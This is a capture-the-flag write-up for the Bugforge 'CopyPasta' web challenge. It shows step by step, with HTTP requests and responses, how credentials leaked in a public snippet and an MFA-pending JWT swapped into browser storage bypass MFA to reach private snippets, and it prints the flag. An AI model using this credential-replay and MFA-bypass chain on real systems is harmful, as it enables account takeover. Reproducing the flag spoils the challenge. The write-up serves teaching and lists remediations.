# CopyPasta - copypasta-015 - Is the token valid?

## Overview

- **Challenge:** CopyPasta
- **Platform:** Bugforge
- **Category:** Web Exploitation
- **Difficulty:** Intermediate
- **Objective:** Exploit authentication and authorization weaknesses to retrieve a private snippet containing the flag.

## Hint

> Is the token valid?

---

## Step 1: Register a Test Account

Register a new account through the application's registration functionality.

### Request

```http
POST /api/register HTTP/2
Content-Type: application/json

{
  "username": "test",
  "email": "test@mail.com",
  "password": "qwerty",
  "full_name": "Test"
}
```

### Response

```json
{
  "token": "<JWT>",
  "user": {
    "id": 6,
    "username": "test",
    "email": "test@mail.com",
    "full_name": "Test",
    "role": "user"
  }
}
```

The JWT contained the following payload:

```json
{
  "id": 6,
  "username": "test",
  "stage": "complete",
  "iat": 1794663286
}
```

---

## Step 2: Enumerate Public Snippets

Navigate to the public snippets endpoint:

```http
GET /api/snippets/public
```

The endpoint returned publicly accessible snippets belonging to different users.

While inspecting the snippets, one particularly interesting entry was discovered.

### Interesting Snippet

**Title:** Deploy dashboard login (quick smoke test)

**Author:** jeremy

**Description:** Handy one-liner I run to check the deploy dashboard is up.

The snippet contained hardcoded credentials:

```bash
curl -s -X POST https://deploy.copypasta.internal/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"jeremy","password":"Rel3ase!Deploy2024"}'
```

This exposed credentials belonging to another user.

---

## Step 3: Login Using the Leaked Credentials

Attempt authentication using the credentials discovered in the public snippet.

### Request

```http
POST /api/login HTTP/2
Content-Type: application/json

{
  "username": "jeremy",
  "password": "Rel3ase!Deploy2024"
}
```

### Response

```json
{
  "mfa_required": true,
  "mfa_token": "<JWT>"
}
```

Although the login required MFA, the application issued an MFA-pending JWT.

### Decoded JWT Payload

```json
{
  "id": 5,
  "username": "jeremy",
  "stage": "mfa_pending",
  "iat": 1794664283
}
```

The token clearly indicated that authentication had not been fully completed.

---

## Step 4: Replace the JWT in Local Storage

Return to the browser tab authenticated as the test user.

1. Open Developer Tools.
2. Navigate to **Application / Storage → Local Storage**.
3. Locate the authentication token.
4. Replace the test user's token with Jeremy's MFA-pending token.
5. Refresh the application.

The browser subsequently made an authenticated request:

```http
GET /api/snippets
```

### Response

The server returned snippets belonging to Jeremy, including private content.

This demonstrated that the backend accepted the MFA-pending JWT for an authenticated API request without properly enforcing the authentication stage.

---

## Step 5: Retrieve the Private Snippet

The response contained a private snippet:

### Production deploy runbook

```bash
#!/usr/bin/env bash

# Internal — do not share.
# Ship a build to prod from the release host.

set -euo pipefail

export DEPLOY_TOKEN="bug{8UktCXDF3HQK8YaHaYduLAmbaGi7qhzm}"

deployctl login --token "$DEPLOY_TOKEN"
deployctl push --env production --service copypasta-web
```

The deployment token embedded in the private snippet was the challenge flag.

---

## Flag

```text
bug{8UktCXDF3HQK8YaHaYduLAmbaGi7qhzm}
```

---

## Vulnerabilities Identified

### 1. Sensitive Information Disclosure

Public snippets exposed hardcoded credentials belonging to another user.

### 2. Improper Authentication State Validation

The application issued an MFA-pending JWT after password authentication.

However, the backend accepted this token for authenticated API access without requiring MFA completion.

### 3. Broken Access Control

The authenticated snippets endpoint exposed private snippets belonging to another user.

### 4. Sensitive Data Exposure

A private deployment runbook contained a production deployment token.

---

## Remediation

- Never store passwords or deployment tokens in source code or public snippets.
- Enforce MFA completion server-side before granting authenticated access.
- Validate JWT claims and authentication stages on every protected request.
- Enforce ownership and privacy checks for private snippets.
- Use secure secret-management solutions for deployment credentials.
- Rotate exposed credentials and deployment tokens immediately.
- Apply least-privilege authorization to internal deployment services.

---

## Conclusion

The CopyPasta challenge demonstrated how multiple weaknesses can be chained together:

**Public credential leak → MFA-pending JWT → authentication-stage bypass → private snippet disclosure → deployment token exposure.**

The challenge was solved by retrieving the private production deployment runbook and extracting the flag.